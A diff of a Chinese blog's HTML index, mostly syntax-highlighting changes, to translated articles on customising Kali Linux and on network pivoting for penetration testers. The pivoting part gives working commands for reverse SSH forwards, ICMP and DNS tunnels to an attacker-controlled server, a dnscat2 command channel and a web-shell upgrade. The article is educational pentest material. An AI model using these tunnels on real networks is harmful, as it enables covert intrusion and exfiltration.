class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;zipcode&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;100081&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;prof&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;Computer System&quot;</span><span class="punctuation">,</span> <span class="string">&quot;Security&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="YAML"><a href="#YAML" class="headerlink" title="YAML"></a>YAML</h2><p><strong>YAML</strong>，在开发这种语言之初，其意为 Yet Another Markup Language（仍是一种标记语言），之后为了强调这种语言以数据作为中心，而不是以标记语言为重点，故解释为 YAML Ain&#39;t a Markup Language（YAML 不是一种标记语言），倘若我要表示某个人的简要信息，用 YAML 可写为：</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">firstName :</span> <span class="string">Tian</span></span><br><span class="line"><span class="attr">lastName :</span> <span class="string">Song</span></span><br><span class="line"><span class="attr">address :</span></span><br><span class="line">    <span class="attr">streetAddr :</span> <span class="string">中关村南大街5号</span></span><br><span class="line">    <span class="attr">city :</span> <span class="string">北京市</span></span><br><span class="line">    <span class="attr">zipcode :</span> <span class="number">100081</span></span><br><span class="line"><span class="attr">prof :</span></span><br><span class="line"><span class="string">-Computer</span> <span class="string">System</span></span><br><span class="line"><span class="string">-Security</span></span><br></pre></td></tr></table></figure>
@@ -4862,10 +4864,10 @@
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install git</span><br></pre></td></tr></table></figure>
 
 <h2 id="2、配置-Bash-别名"><a href="#2、配置-Bash-别名" class="headerlink" title="2、配置 Bash 别名"></a>2、配置 Bash 别名</h2><p>Bash 别名非常适合创建自定义命令行快捷方式。例如，我们可以重新分配 <a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-2-creating-directories-files-0147234/">ls</a> 命令以自动使用我们最喜欢的参数。下面是正常 <strong>ls</strong> 输出的示例。</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line"></span><br><span class="line"> androidbins.txt                                      folder-pictures.png     smtp.cracked         text-x-generic.png</span><br><span class="line"> bogus_gmail.creds                                    folder.png              smtp.list            Windows-10</span><br><span class="line"> dumpzilla-b3075d1960874ce82ea76a5be9f58602afb61c39   package-x-generic.png   text-x-generic.ico  <span class="string">&#x27;Windows 10 Icons&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"> androidbins.txt                                      folder-pictures.png     smtp.cracked         text-x-generic.png</span><br><span class="line"> bogus_gmail.creds                                    folder.png              smtp.list            Windows-10</span><br><span class="line"> dumpzilla-b3075d1960874ce82ea76a5be9f58602afb61c39   package-x-generic.png   text-x-generic.ico  <span class="string">&#x27;Windows 10 Icons&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>在创建 <strong>ls</strong> 别名后再次输出的示例。</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line"></span><br><span class="line">total 220K</span><br><span class="line">-rw-------  1 root root  15K Aug 24  2015  folder-pictures.png</span><br><span class="line">-rw-------  1 root root 8.7K Aug 24  2015  folder.png</span><br><span class="line">-rw-------  1 root root  11K Aug 24  2015  package-x-generic.png</span><br><span class="line">-rw-------  1 root root 5.5K Sep  3  2015  text-x-generic.png</span><br><span class="line">drwxr-xr-x 12 root root 4.0K May 31 00:44 <span class="string">&#x27;Windows 10 Icons&#x27;</span>/</span><br><span class="line">drwxr-xr-x 18 root root 4.0K May 31 00:44  Windows-10/</span><br><span class="line">-rwxr-x---  1 root root 103K May 31 00:49  text-x-generic.ico*</span><br><span class="line">drwxr-xr-x  5 root root 4.0K Jun 11 21:57  dumpzilla-b3075d1960874ce82ea76a5be9f58602afb61c39/</span><br><span class="line">-rw-r--r--  1 root root   52 Jul  5 18:13  bogus_gmail.creds</span><br><span class="line">-rw-r--r--  1 root root  15K Jul  5 18:28  smtp.list</span><br><span class="line">-rw-r--r--  1 root root  181 Jul  5 18:43  smtp.cracked</span><br><span class="line">-rw-r--r--  1 root root  23K Jul 23 18:18  androidbins.txt</span><br><span class="line">drwxr-xr-x  5 root root 4.0K Jul 23 19:22  ./</span><br><span class="line">drwxr-xr-x 23 root root 4.0K Aug  9 04:25  ../</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">total 220K</span><br><span class="line">-rw-------  1 root root  15K Aug 24  2015  folder-pictures.png</span><br><span class="line">-rw-------  1 root root 8.7K Aug 24  2015  folder.png</span><br><span class="line">-rw-------  1 root root  11K Aug 24  2015  package-x-generic.png</span><br><span class="line">-rw-------  1 root root 5.5K Sep  3  2015  text-x-generic.png</span><br><span class="line">drwxr-xr-x 12 root root 4.0K May 31 00:44 <span class="string">&#x27;Windows 10 Icons&#x27;</span>/</span><br><span class="line">drwxr-xr-x 18 root root 4.0K May 31 00:44  Windows-10/</span><br><span class="line">-rwxr-x---  1 root root 103K May 31 00:49  text-x-generic.ico*</span><br><span class="line">drwxr-xr-x  5 root root 4.0K Jun 11 21:57  dumpzilla-b3075d1960874ce82ea76a5be9f58602afb61c39/</span><br><span class="line">-rw-r--r--  1 root root   52 Jul  5 18:13  bogus_gmail.creds</span><br><span class="line">-rw-r--r--  1 root root  15K Jul  5 18:28  smtp.list</span><br><span class="line">-rw-r--r--  1 root root  181 Jul  5 18:43  smtp.cracked</span><br><span class="line">-rw-r--r--  1 root root  23K Jul 23 18:18  androidbins.txt</span><br><span class="line">drwxr-xr-x  5 root root 4.0K Jul 23 19:22  ./</span><br><span class="line">drwxr-xr-x 23 root root 4.0K Aug  9 04:25  ../</span><br></pre></td></tr></table></figure>
 
 <p>我们得到了更详细的输出。<strong>ls</strong> 命令现在自动使用 <strong>-l</strong>，**-a<strong>，</strong>-t<strong>，</strong>-h** 和 <strong>-r</strong> 参数。所有这些参数都将指示 <strong>ls</strong> 使用列表（**-l<strong>）格式，列出所有（</strong>-a<strong>）文件 —— 包括隐藏文件 —— 并以人类可读（</strong>-h**）的格式打印文件大小（例如，1K，234M，5G）。</p>
 <p>我的别名还将按修改时间（**-t<strong>）对输出进行排序，并反转（</strong>-r**）列表的顺序，以便最近修改的文件出现在终端的底部。这个参数集合是我个人的 <strong>ls</strong> 偏好，但你的可能会有所不同。</p>
@@ -4873,7 +4875,7 @@
 <ul>
 <li>不要错过：<a href="https://null-byte.wonderhowto.com/how-to/intro-vim-unix-text-editor-every-hacker-should-be-familiar-with-0174674/">Vim 简介，每个黑客都应该知道的 Unix 文本编辑器</a></li>
 </ul>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> ls=<span class="string">&#x27;ls --color=always -rthla&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> <span class="built_in">ls</span>=<span class="string">&#x27;ls --color=always -rthla&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>我们还可以进一步向 <code>.bash_aliases</code> 文件添加更复杂的函数。下面是一个简单的函数示例，旨在使 Kali 保持最新状态。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> apt-updater &#123;</span><br><span class="line">    apt-get update &amp;&amp;</span><br><span class="line">    apt-get dist-upgrade -Vy &amp;&amp;</span><br><span class="line">    apt-get autoremove -y &amp;&amp;</span><br><span class="line">    apt-get autoclean &amp;&amp;</span><br><span class="line">    apt-get clean &amp;&amp;</span><br><span class="line">    reboot</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
@@ -4893,7 +4895,7 @@
 <p>亚马逊推荐：<a href="https://www.amazon.cn/dp/B00BQTWC0U">William E. Shotts Jr. 撰写的“Linux命令行大全”</a></p>
 <h2 id="5、安装你喜爱的黑客工具"><a href="#5、安装你喜爱的黑客工具" class="headerlink" title="5、安装你喜爱的黑客工具"></a>5、安装你喜爱的黑客工具</h2><p>某些版本的 Kali 面向极简主义的渗透测试者，他们不希望预先安装数百个黑客工具。这意味着我们必须手动安装我们喜欢的工具。我们使用的工具类型根据我们的技能和专业领域而有所不同，但以下是一些流行的黑客工具。</p>
 <ul>
-<li><a href="https://www.aircrack-ng.org/">Aircrack-ng</a>：无线 <a href="https://null-byte.wonderhowto.com/how-to/hack-wi-fi-getting-started-with-aircrack-ng-suite-wi-fi-hacking-tools-0147893/">WEP/WPA 破解实用程序</a>。</li>
+<li><a href="https://www.aircrack-ng.org/">Aircrack-ng</a>：无线 <a href="https://null-byte.wonderhowto.com/how-to/hack-wi-fi-getting-started-with-aircrack-ng-suite-wi-fi-hacking-tools-0147893/">WEP&#x2F;WPA 破解实用程序</a>。</li>
 <li><a href="https://beefproject.com/">BeEF</a>：通过 Web 应用程序的浏览器<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-hack-web-browsers-with-beef-0159961/">漏洞利用框架</a>。</li>
 <li><a href="https://portswigger.net/burp/">Burp Suite</a>：专为 <a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-hack-web-apps-part-4-hacking-form-authentication-with-burp-suite-0163642/">Web 应用程序安全性</a>而设计的图形应用。</li>
 <li><a href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a>：登录<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/">密码暴力破解</a>实用程序。</li>
@@ -4957,7 +4959,7 @@
     <url>/2017/12/10/pivoting-guide/</url>
     <content><![CDATA[<p>本文翻译自 <a href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/</a> ，正文如下：</p>
 <hr>
-<p>渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是 red team/pentest 参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。</p>
+<p>渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是 red team&#x2F;pentest 参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。</p>
 <span id="more"></span>
 
 <h2 id="以公有-IP-为目标"><a href="#以公有-IP-为目标" class="headerlink" title="以公有 IP 为目标"></a>以公有 IP 为目标</h2><p>一个普遍的情况。比方说，你可以从互联网上找到一个网络应用程序中的 RCE 漏洞。你上传了一个 shell，并想把你的攻击发展到内部网络。请注意，在这种特定情况下，你应该能够绑定受感染主机上的端口，并且应该可以从外部网络访问这些端口。</p>
@@ -4969,7 +4971,7 @@
 
 <p>这样，端口 445 就会被打开在攻击者一侧。请注意，要绑定特权端口（例如 445），你将需要在你的计算机上拥有 root 权限。</p>
 <h4 id="通过-SSH-的-VPN"><a href="#通过-SSH-的-VPN" class="headerlink" title="通过 SSH 的 VPN"></a>通过 SSH 的 VPN</h4><p>由于 openssh 4.3 版本，可以通过已建立的 ssh 通道来传输第 3 层网络流量。这比典型的 tcp 隧道有优势，因为你在控制 ip 流量。因此，例如，你可以使用 nmap 执行 SYN 扫描，并直接使用你的工具，而无需使用 <code>proxychains</code> 或其他代理工具。它是通过在客户端和服务器端创建 tun 设备并通过 ssh 连接在它们之间传输数据完成的。这很简单，但是由于 tun 设备的创建是一个特权操作，所以在两台机器上都需要 root。这些行应该出现在 <code>/etc/ssh/sshd_config</code> 文件（服务器端）中：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PermitRootLogin yes</span><br><span class="line">PermitTunnel yes</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line">PermitTunnel <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
 
 <p>客户端上的以下命令将在客户端和服务器上创建一对 tun 设备：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh username@server -w any:any</span><br></pre></td></tr></table></figure>
@@ -4983,7 +4985,7 @@
 <p>在服务器上启用 IP 转发和 NAT：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE</span><br></pre></td></tr></table></figure>
 
-<p>现在，你可以将对等主机 <code>1.1.1.1</code> 设置为你的默认网关，或通过它路由到特定的主机/网络：</p>
+<p>现在，你可以将对等主机 <code>1.1.1.1</code> 设置为你的默认网关，或通过它路由到特定的主机&#x2F;网络：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">route add -net 10.0.0.0/16 gw 1.1.1.1</span><br></pre></td></tr></table></figure>
 
 <p>在这个例子中，服务器的外部网络接口是 <code>eth0</code>，两端新创建的 tun 设备是 <code>tun0</code>。</p>
@@ -4996,18 +4998,18 @@
 <p>要在端口 1080 上运行 3proxy 作为 socks5 代理，请在 config 中放置以下行：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socks -p1080</span><br></pre></td></tr></table></figure>
 
-<p>现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和/或基于 IP 的访问控制规则。去检查完整的手册在这里 - <a href="https://3proxy.ru/howtoe.asp">https://3proxy.ru/howtoe.asp</a> 。要对特定端口进行隧道使用，请用以下语法：</p>
+<p>现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和&#x2F;或基于 IP 的访问控制规则。去检查完整的手册在这里 - <a href="https://3proxy.ru/howtoe.asp">https://3proxy.ru/howtoe.asp</a> 。要对特定端口进行隧道使用，请用以下语法：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tcppm &lt;localport&gt; &lt;targethost&gt; &lt;targetport&gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="NAT-场景"><a href="#NAT-场景" class="headerlink" title="NAT 场景"></a>NAT 场景</h2><p>这是我在交战中遇到的最常见的情况。到目标的流量正在转发到逐个端口的基础上。这意味着除了端口转发规则以外的所有端口都不能从外部访问。一种可能的解决方案是启动反向连接。下面介绍的工具将帮助你做到这一点。</p>
-<h3 id="SSH-反向端口转发-w-3proxy"><a href="#SSH-反向端口转发-w-3proxy" class="headerlink" title="SSH 反向端口转发/w 3proxy"></a>SSH 反向端口转发/w 3proxy</h3><p>这个跳板设置看起来像这样：<br>在目标服务器上使用以下配置运行 3proxy 服务：</p>
+<h3 id="SSH-反向端口转发-x2F-w-3proxy"><a href="#SSH-反向端口转发-x2F-w-3proxy" class="headerlink" title="SSH 反向端口转发&#x2F;w 3proxy"></a>SSH 反向端口转发&#x2F;w 3proxy</h3><p>这个跳板设置看起来像这样：<br>在目标服务器上使用以下配置运行 3proxy 服务：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socks -p31337</span><br></pre></td></tr></table></figure>
 
 <p>在接收方（攻击者的机器）上创建一个单独的用户。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adduser sshproxy</span><br></pre></td></tr></table></figure>
 
-<p>这个用户必须是低权限的，不应该有 shell 权限。毕竟，你不想被反向渗透，你呢？:)编辑 /etc/passwd 并将 shell 切换到 /bin/false。它应该是这样的：</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/<span class="literal">false</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>这个用户必须是低权限的，不应该有 shell 权限。毕竟，你不想被反向渗透，你呢？:)编辑 &#x2F;etc&#x2F;passwd 并将 shell 切换到 &#x2F;bin&#x2F;false。它应该是这样的：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/false</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>现在使用 <code>-R</code> 标志连接到新创建的用户的服务器。Linux 系统：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh sshproxy@your_server -R 31337:127.0.0.1:31337</span><br></pre></td></tr></table></figure>
@@ -5024,7 +5026,7 @@
 
 <p>结果，一个 socks4 代理服务将被绑定在服务器端的 1080 端口。</p>
 <h2 id="从内部网络泄漏"><a href="#从内部网络泄漏" class="headerlink" title="从内部网络泄漏"></a>从内部网络泄漏</h2><p>这是另一种情况。比方说，你的社会工程学表演最终让你进入了内部网络。你的连接受限，并且能够在受感染的计算机上执行命令。当然，如果互联网直接路由，而不是用做防火墙，你可以凭借任何上述技术。但如果你不那么幸运，还是有办法把你的出路转出来。</p>
-<h3 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h3><p>如果 icmp 流量被允许到外部网络，那么很可能你可以建立一个 icmp 隧道。缺点是你需要在目标系统上拥有 root/administrator 权限，因为有必要使用原始套接字。检查这个工具 - <a href="http://code.gerade.org/hans/">http://code.gerade.org/hans/</a> 。我个人从来没有尝试过在 Windows 上运行它。它在 Linux 上非常有效。服务器端命令（攻击者的机器）：</p>
+<h3 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h3><p>如果 icmp 流量被允许到外部网络，那么很可能你可以建立一个 icmp 隧道。缺点是你需要在目标系统上拥有 root&#x2F;administrator 权限，因为有必要使用原始套接字。检查这个工具 - <a href="http://code.gerade.org/hans/">http://code.gerade.org/hans/</a> 。我个人从来没有尝试过在 Windows 上运行它。它在 Linux 上非常有效。服务器端命令（攻击者的机器）：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./hans -v -f -s 1.1.1.1 -p P@ssw0rd</span><br></pre></td></tr></table></figure>
 
 <p><code>-v</code> 标志是详细的，<code>-f</code> 标志在前台运行，<code>-s</code> 标志的值是服务器在新创建的 tun 接口上的 ip。<br>客户端：</p>
@@ -5033,7 +5035,7 @@
 <p>连接成功后，客户端应该可以直接在 1.1.1.100 处看到：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ping 1.1.1.100</span></span><br><span class="line">PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.</span><br><span class="line">64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms</span><br></pre></td></tr></table></figure>
 
-<p>现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh/tsh /web shell）。</p>
+<p>现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh&#x2F;tsh &#x2F;web shell）。</p>
 <h3 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h3><p>如果有任何广域网流量被阻塞，但是外部主机名被解析，那么就有可能通过DNS查询来进行隧道通信。你需要注册一个用于此技术工作的域名。<a href="http://dev.kryo.se/iodine/wiki/HowtoSetup">这个手册</a>可能会帮助你设置你的名称服务器。</p>
 <h4 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h4><p>如果发生这种情况，并且在服务器上获得了 root 访问权限，你可以试试 <a href="http://code.kryo.se/iodine/">iodine</a>。它几乎像 hans icmp 隧道工具一样工作 - 它创建了一对 tun 适配器，并将它们之间的数据作为 DNS 查询进行隧道传输。服务器端：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com</span><br></pre></td></tr></table></figure>
@@ -5044,7 +5046,7 @@
 <p>连接成功将在地址 1.1.1.2 处产生直接的客户端可见性。请注意，这种隧道技术非常慢。你最好的选择是在生成的连接上使用一个压缩的 ssh 连接：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080</span><br></pre></td></tr></table></figure>
 
-<h4 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h4><p><a href="https://github.com/iagox86/dnscat2">Dnscat2</a> 通过递归 DNS 查询建立 C＆C 通道。这个工具不需要 root/administrator 权限（在 windows 和 linux 上都可以）。它也支持端口转发。服务器端：</p>
+<h4 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h4><p><a href="https://github.com/iagox86/dnscat2">Dnscat2</a> 通过递归 DNS 查询建立 C＆C 通道。这个工具不需要 root&#x2F;administrator 权限（在 windows 和 linux 上都可以）。它也支持端口转发。服务器端：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ruby ./dnscat2.rb tunneldomain.com</span><br></pre></td></tr></table></figure>
 
 <p>客户端：</p>
@@ -5067,7 +5069,7 @@
 <p>或者如果你有 LM:NT 哈希而不是密码：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python client.py --server-ip &lt;rpivot_server_ip&gt;\</span><br><span class="line">--server-port 9999 --ntlm-proxy-ip &lt;proxy_ip&gt; --ntlm-proxy-port 8080 --domain CONTOSO.COM\</span><br><span class="line">--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45</span><br></pre></td></tr></table></figure>
 
-<h4 id="Cntlm"><a href="#Cntlm" class="headerlink" title="Cntlm"></a>Cntlm</h4><p><a href="http://cntlm.sourceforge.net/">Cntlm</a> 是通过 NTLM 代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如 putty/ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口 443（这个端口是最有可能被允许通过代理的）：</p>
+<h4 id="Cntlm"><a href="#Cntlm" class="headerlink" title="Cntlm"></a>Cntlm</h4><p><a href="http://cntlm.sourceforge.net/">Cntlm</a> 是通过 NTLM 代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如 putty&#x2F;ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口 443（这个端口是最有可能被允许通过代理的）：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Username Alice</span><br><span class="line">Password P@ssw0rd</span><br><span class="line">Domain CONTOSO.COM</span><br><span class="line">Proxy 10.0.0.10:8080</span><br><span class="line">Tunnel 2222:&lt;attackers_machine&gt;:443</span><br></pre></td></tr></table></figure>
 
 <p>运行：</p>
@@ -5076,12 +5078,12 @@
 <p>或者如果你在 Linux 上：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./cntlm -c config.conf</span><br></pre></td></tr></table></figure>
 
-<p>现在，假设你已经在远程主机的 443 端口上运行 ssh，你可以启动 ssh 客户端（openssh/putty）并连接到本地端口 2222 来访问外部机器。</p>
+<p>现在，假设你已经在远程主机的 443 端口上运行 ssh，你可以启动 ssh 客户端（openssh&#x2F;putty）并连接到本地端口 2222 来访问外部机器。</p>
 <h4 id="通过-HTTP-代理的-OpenVpn"><a href="#通过-HTTP-代理的-OpenVpn" class="headerlink" title="通过 HTTP 代理的 OpenVpn"></a>通过 HTTP 代理的 OpenVpn</h4><p><a href="https://openvpn.net/index.php/open-source/documentation/howto.html">OpenVpn</a> 是巨大的，所以它从头开始的配置超出了这篇文章的范围。只需简单提一下 - 它也支持通过 NTLM 代理的隧道 TCP 连接。将此行添加到你的配置文件中：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http-proxy &lt;proxy_ip&gt; 8080 &lt;file_with_creds&gt; ntlm</span><br></pre></td></tr></table></figure>
 
 <p>凭证文件应该在不同的行上包含用户名和密码。而且，是的，你需要 root。</p>
-<h2 id="利用带有-proxychains-的-SOCKS"><a href="#利用带有-proxychains-的-SOCKS" class="headerlink" title="利用带有 proxychains 的 SOCKS"></a>利用带有 proxychains 的 SOCKS</h2><p>如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用 <code>proxychains</code> 来强制你的程序通过 socks 代理。编辑 /etc/proxychains.conf 中的代理服务器：</p>
+<h2 id="利用带有-proxychains-的-SOCKS"><a href="#利用带有-proxychains-的-SOCKS" class="headerlink" title="利用带有 proxychains 的 SOCKS"></a>利用带有 proxychains 的 SOCKS</h2><p>如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用 <code>proxychains</code> 来强制你的程序通过 socks 代理。编辑 &#x2F;etc&#x2F;proxychains.conf 中的代理服务器：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="comment"># add proxy here ...</span></span><br><span class="line"><span class="comment"># meanwile</span></span><br><span class="line"><span class="comment"># defaults set to &quot;tor&quot;</span></span><br><span class="line">socks4  127.0.0.1 3128</span><br></pre></td></tr></table></figure>
 
 <p>准备好了，只需在你最喜欢的 pwn 工具上添加 <code>proxychains</code>：</p>
@@ -5092,34 +5094,34 @@
 <h2 id="DNS-与-proxychains"><a href="#DNS-与-proxychains" class="headerlink" title="DNS 与 proxychains"></a>DNS 与 proxychains</h2><p>Proxychains 在解析主机名时不遵循 socks RFC。它拦截 <code>gethostbyname</code> libc 调用并通过 socks 代理隧道化 tcp DNS 请求。事情是，DNS 服务器硬编码到 <code>4.2.2.2</code>。你可能需要更改名称服务器以解析内部网络上的名称。一个典型的情况是如果你正在测试 Windows 环境，将名称服务器更改为域控制器。该设置位于 <code>/usr/lib/proxychains3/proxyresolv</code>：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># This script is called by proxychains to resolve DNS names</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS server used to resolve names</span></span><br><span class="line">DNS_SERVER=<span class="variable">$&#123;PROXYRESOLV_DNS:-4.2.2.2&#125;</span>    <span class="comment">#change nameserver here</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> = 0 ] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;  usage:&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;      proxyresolv &lt;hostname&gt; &quot;</span></span><br><span class="line">    <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="美化你的-web-shell"><a href="#美化你的-web-shell" class="headerlink" title="美化你的 web shell"></a>美化你的 web shell</h2><p>这部分内容与 pivoting 或 tunneling 没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用 web-shell 非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给 sudo/su 或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将 web-shell 升级到一个交互式 shell 时，我这样做:)我不会介绍像使用 bash/perl/python 等启动半交互式 shell。有很多关于这样做的信息。看看这个反向 shell 备忘单 - <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> 。</p>
+<h2 id="美化你的-web-shell"><a href="#美化你的-web-shell" class="headerlink" title="美化你的 web shell"></a>美化你的 web shell</h2><p>这部分内容与 pivoting 或 tunneling 没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用 web-shell 非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给 sudo&#x2F;su 或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将 web-shell 升级到一个交互式 shell 时，我这样做:)我不会介绍像使用 bash&#x2F;perl&#x2F;python 等启动半交互式 shell。有很多关于这样做的信息。看看这个反向 shell 备忘单 - <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> 。</p>
 <h3 id="Python-PTY-shell"><a href="#Python-PTY-shell" class="headerlink" title="Python PTY shell"></a>Python PTY shell</h3><p>从常规的半交互式 shell 升级。你可以在现有的 shell 中执行以下命令：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>或者启动反向连接：</p>
